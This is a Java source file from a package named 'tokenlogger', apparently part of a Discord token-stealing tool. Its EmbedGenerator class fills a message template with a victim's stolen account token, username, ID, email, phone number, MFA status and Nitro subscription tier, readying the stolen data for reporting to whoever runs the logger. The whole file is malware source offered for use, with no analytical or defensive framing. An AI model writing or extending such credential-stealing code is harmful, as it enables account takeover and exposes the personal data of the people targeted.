package tokenlogger.utils;

import java.net.URL;
import java.util.HashMap;
import java.util.Map;

import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.node.ObjectNode;

public class EmbedGenerator {
    private static final String TEMPLATE_PATH = "/EmbedTemplate.json";
    private static final Map<String, String> NITRO_TRANSLATION = new HashMap<>();

    static {
        NITRO_TRANSLATION.put("0", "None");
        NITRO_TRANSLATION.put("1", "Nitro Classic");
        NITRO_TRANSLATION.put("2", "Nitro");
        NITRO_TRANSLATION.put("3", "Nitro Basic");
    }

    public static String generateEmbed(String userInfoJson, String token) {
        try {
            URL embedTemplate = EmbedGenerator.class.getResource(TEMPLATE_PATH);
            JsonNode templateNode = Json.getObjectMapper().readTree(embedTemplate);
            Map<String, String> placeholders = createPlaceholders(userInfoJson, token);
            return populateTemplate(templateNode, placeholders).toString();
        } catch (Exception e) {
            return null;
        }
    }

    private static Map<String, String> createPlaceholders(String userInfoJson, String token) throws JsonProcessingException {
        Map<String, String> placeholders = new HashMap<>();
        String[] fields = {"username", "id", "avatar", "email", "phone", "mfa_enabled"};
        JsonNode userInfo = Json.getObjectMapper().readTree(userInfoJson);

        for (String field : fields) {
            placeholders.put(field, get(userInfo, field));
        }

        String nitro = get(userInfo, "premium_type");
        placeholders.put("premium_type", NITRO_TRANSLATION.getOrDefault(nitro, nitro));
        placeholders.put("token", token);

        return placeholders;
    }

    private static String get(JsonNode node, String field) {
        JsonNode valueNode = node.get(field);
        return valueNode != null ? valueNode.asText() : null;
    }

    private static ObjectNode populateTemplate(JsonNode templateNode, Map<String, String> placeholders) throws JsonProcessingException {
        String template = templateNode.toString();

        for (Map.Entry<String, String> entry : placeholders.entrySet()) {
            template = template.replace("%" + entry.getKey(), entry.getValue());
        }

        return Json.getObjectMapper().readValue(template, ObjectNode.class);
    }
}